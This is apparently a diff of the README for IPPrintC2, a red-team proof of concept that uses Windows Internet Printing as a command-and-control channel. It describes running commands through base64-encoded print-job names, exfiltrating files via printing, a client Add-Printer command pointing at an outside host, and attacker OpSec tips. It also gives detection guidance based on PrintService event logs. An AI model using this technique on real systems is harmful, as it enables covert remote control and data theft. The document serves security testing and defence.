@@ -2,29 +2,31 @@
 ### TL;DR
 A Proof-of-Concept for using Microsoft Windows printers for persistence / command and control via Internet Printing.
 
+Printing systems are an often overlooked target for attackers looking to establish command and control (C2) channels on a victim's network. An attacker can abuse the operating system's printing system to add and remove printers and create and manipulate printing jobs to achieve full C2 communication. We have developed a complete proof of concept of such a solution that we have successfully tested in real-world red teaming exercises. By understanding the approach taken in this specific abuse of printing systems, we can take steps to secure them and prevent them from being exploited by malicious actors.
+
 ### Background story
-The idea was to create a basic C2 for engagements using built-in Windows functionalities, which can then be used to execute arbitrary commands or load a preferable C2 solution (https://www.thec2matrix.com/matrix). 
+The idea was to create a basic C2 for engagements using built-in Windows functionalities, which can then be used to execute arbitrary commands or load a preferable C2 solution (<https://howto.thec2matrix.com/>).
 
-A feature in Microsoft Windows was used which enables to install shared printers through Internet Printing Protocol (https://en.wikipedia.org/wiki/Internet_Printing_Protocol). 
-Regular users can add a printer without administrative privileges as long there is no driver installation, so usage of existing drivers was mandatory. A default "Microsoft Print to PDF" driver was used. 
+A feature in Microsoft Windows was used that enables to install of shared printers through Internet Printing Protocol (<https://en.wikipedia.org/wiki/Internet_Printing_Protocol>).
+Regular users can add a printer without administrative privileges as long there is no driver installation, so usage of existing drivers was mandatory. A default "Microsoft Print to PDF" driver was used.
 
-The commands that will be executed are sent from the C2 Internet Printing server to the printer's document queue as base64-encoded document names. With basic PowerShell, clients can then obtain these document names from the queue and execute commands on themselves. Also, clients can print documents to this printer that will be saved to a file on the C2 server which is useful to fetch results from executed commands or to exfiltrate documents. An additional plus was that adding a printer shared on the Internet passed through couple of web proxy solutions commonly used in enterprises. Tested on Windows Server 2019 and Windows 10 / 11.
+The commands that will be executed are sent from the C2 Internet Printing server to the printer's document queue as base64-encoded document names. With basic PowerShell, clients can then obtain these document names from the queue and execute commands on themselves. Also, clients can print documents to this printer that will be saved to a file on the C2 server which is useful to fetch results from executed commands or to exfiltrate documents. An additional plus was that adding a printer shared on the Internet passed through a couple of web proxy solutions commonly used in enterprises. Tested on Windows Server 2019 and Windows 10 / 11.
 
 ### Server
-Internet Information Services, Windows Print Services, Print Server and Internet Printing are required to set up a C2 server. Anonymous authentication is enabled on Internet Information Services so clients can obtain the document queue without authentication and the owner of print jobs is the IUSR user account. The server also installs the shared printer for itself and uses it to submit jobs to its print queue, otherwise the document owner would not be the IUSR user and clients would not be able to obtain the document name from the queue.
+Internet Information Services, Windows Print Services, Print Server and Internet Printing are required to set up a C2 server. Anonymous authentication is enabled on Internet Information Services so clients can obtain the document queue without authentication and the owner of print jobs is the IUSR user account. The server also installs the shared printer for itself and uses it to submit jobs to its print queue, otherwise, the document owner would not be the IUSR user and clients would not be able to obtain the document name from the queue.
 
 The installation script is provided in this repository and should work. Check if you can access your printer to make sure everything went well:
 ```
 http(s)://<IP or DNS>/printers/
 http(s)://<IP or DNS>/printers/<printername>/.printer
 ```
-Once all is set up, run the IPPrintC2.ps1 and enter commands which you would like to execute on the client through the document name. The document name has its length limitations, so if the length of the base64 encoded command in the document name is larger than 255 characters, it gets split to several documents in the print queue. This is handled by the IPPrintC2 script while the concatenation is handled by the client.
+Once all is set up, run the IPPrintC2.ps1 and enter commands that you would like to execute on the client through the document name. The document name has its length limitations, so if the length of the base64 encoded command in the document name is larger than 255 characters, it gets split to several documents in the print queue. This is handled by the IPPrintC2 script while the concatenation is handled by the client.
 
 ```
 PS C:\Users\administrator\Desktop> .\IPPrintC2.ps1
 IPPrint C2 Server
-1. Select default C2 printer.
-2. Enter command to execute on the client through document name.
+1. Select the default C2 printer.
+2. Enter the command to execute on the client through the document name.
 3. Enter the path of the PowerShell script you would like to execute.
 4. Exfiltrate remote documents.
 5. Read IIS logs.
@@ -38,16 +40,16 @@ Enter commands you wish to execute: [scriptblock]$x={whoami /all;hostname};$x.in
 You can also load PowerShell scripts. Keep the scripts simple as they may take a while to get split and sent to the document queue. Also, the scripts are one-off since the print queue eventually gets cleared and the character limit is 32767.
 
 #### OpSec
-* Be sure to use the whitelist approach for network segments you are targeting, otherwise anyone can access your print queue.
-* It is recommended to setup SSL for obvious reasons. Easiest way to setup SSL:
+* Be sure to use the whitelist approach for the network segments you are targeting, otherwise anyone can access your print queue.
+* It is recommended to set up SSL for obvious reasons. The easiest way to setup SSL:
     * Setup / generate a DNS record for your VM
-    * https://certifytheweb.com/ can be used to automate CSR and installation
+    * <https://certifytheweb.com/> can be used to automate CSR and installation
     * Make sure to edit site bindings under IIS to enable HTTPS and disable HTTP
-        * https://docs.microsoft.com/en-us/iis/manage/configuring-security/how-to-set-up-ssl-on-iis
+	* <https://docs.microsoft.com/en-us/iis/manage/configuring-security/how-to-set-up-ssl-on-iis>
 
 
 ### Client
-To execute commands on the client, addition of a printer and a persistent job to obtain and execute commands is needed. Examples:
+To execute commands on the client, the addition of a printer and a persistent job to obtain and execute commands is needed. Examples:
 
 ```
 PS C:\Users\regular> Add-Printer XPS -PortName https://somewhere.on.azure.com/printers/af/.printer -DriverName "Microsoft Print To PDF"
@@ -126,7 +128,7 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 
 DESKTOP-PRINTINGFUN
 ```
-Several payloads are available in the repository. 
+Several payloads are available in the repository.
 
 
 ### Detection
@@ -134,9 +136,9 @@ As always, the best way is to centrally monitor the logs of the infrastructure o
 
 By default, printer installation is not logged in the Event Viewer, but this can be enabled:
 * Event Viewer -> Application and Services Logs -> Microsoft -> Windows -> PrintService, right-click and enable the Operational log
-    * https://social.technet.microsoft.com/Forums/windowsserver/en-US/8e7399f6-ffdc-48d6-927b-f0beebd4c7f0/enabling-quotprint-historyquot-through-group-policy?forum=winserverprint
+    * <https://social.technet.microsoft.com/Forums/windowsserver/en-US/8e7399f6-ffdc-48d6-927b-f0beebd4c7f0/enabling-quotprint-historyquot-through-group-policy?forum=winserverprint>
 
-With Print Service Operational log enabled you can monitor installation of printers and additional information with Event ID's 300 and 307.
+With Print Service Operational log enabled you can monitor the installation of printers and additional information with Event ID's 300 and 307.
 
 ```
 Log Name:      Microsoft-Windows-PrintService/Operational
@@ -175,6 +177,7 @@ Event Xml:
   </UserData>
 </Event>
 ```
+
 ```
 Log Name:      Microsoft-Windows-PrintService/Operational
 Source:        Microsoft-Windows-PrintService
@@ -221,20 +224,21 @@ Event Xml:
 ```
 
 ### Files
-* Install/InstallScript.ps1 - PowerShell script that installs the prerequisites. You should setup SSL yourself
+* Install/InstallScript.ps1 - PowerShell script that installs the prerequisites. You should set up SSL yourself
 * Server/IPPrintC2.ps1 - PowerShell script for IPPrintC2 that you run on the server hosting Print Services
 * Payloads/payloads.txt - basic list of payloads to get started
 
 ### Notes
-* The C2 currently works as one-to-all. You can setup additional printers on the C2 server, modify the IPPrintC2.ps1 script and run multiple instances
+* The C2 currently works as one-to-all. You can set up additional printers on the C2 server, modify the IPPrintC2.ps1 script, and run multiple instances
 * Exfiltration of documents needs improvement as it currently works with ASCII text-based files
-* Automatic cleaning of documents printed by client's requires improvements
+* Automatic cleaning of documents printed by clients requires improvements
 * The IPPrintC2 is provided as-is
 
-In the process of writing this simple C2 it was discovered that somewhat similar technique was also used by WithSecure and published earlier. Not only that, but the name (PrintC2) also was the same, so it was changed to IPPrintC2. Nevertheless, due to the differences and different initial mindset / purpose we decided to release our work. 
+In the process of writing this simple C2, it was discovered that a somewhat similar technique was also used by WithSecure and published earlier. Not only that, but the name (PrintC2) also was the same, so it was changed to IPPrintC2. Nevertheless, due to the differences and different initial mindset/purpose we decided to release our work.
 
 ### References
-* https://windows-internals.com/printdemon-cve-2020-1048/
+* [https://github.com/Diverto/IPPrintC2](https://github.com/Diverto/IPPrintC2)
+* [https://windows-internals.com/printdemon-cve-2020-1048/](https://windows-internals.com/printdemon-cve-2020-1048/)
 
 ### Credits
 * Author: @kr3bz
